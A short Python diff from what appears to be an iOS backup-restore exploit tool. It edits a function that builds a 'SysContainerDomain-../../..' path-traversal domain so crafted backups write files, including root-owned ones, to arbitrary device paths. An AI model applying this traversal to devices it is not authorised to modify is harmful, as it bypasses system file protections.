@@ -20,6 +20,9 @@ def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], la
         base_path = "/private/var/mobile/backup"
     elif file.restore_path.startswith("/private/var/"):
         base_path = "/private/var/backup"
+    elif file.owner == 0 and file.group == 0:
+        # restore straight to the file since it won't restore otherwise
+        base_path = ""
     # don't append the directory if it has already been added (restore will fail)
     path, name = os.path.split(file.restore_path)
     domain_path = f"SysContainerDomain-../../../../../../../..{base_path}{path}/"
@@ -27,14 +30,14 @@ def concat_exploit_file(file: FileToRestore, files_list: list[FileToRestore], la
     if last_domain != domain_path:
         files_list.append(backup.Directory(
             "",
-            f"{domain_path}/",
+            f"{domain_path}",
             owner=file.owner,
             group=file.group
         ))
         new_last_domain = domain_path
     files_list.append(backup.ConcreteFile(
         "",
-        f"{domain_path}/{name}",
+        f"{domain_path}{name}",
         owner=file.owner,
         group=file.group,
         contents=file.contents
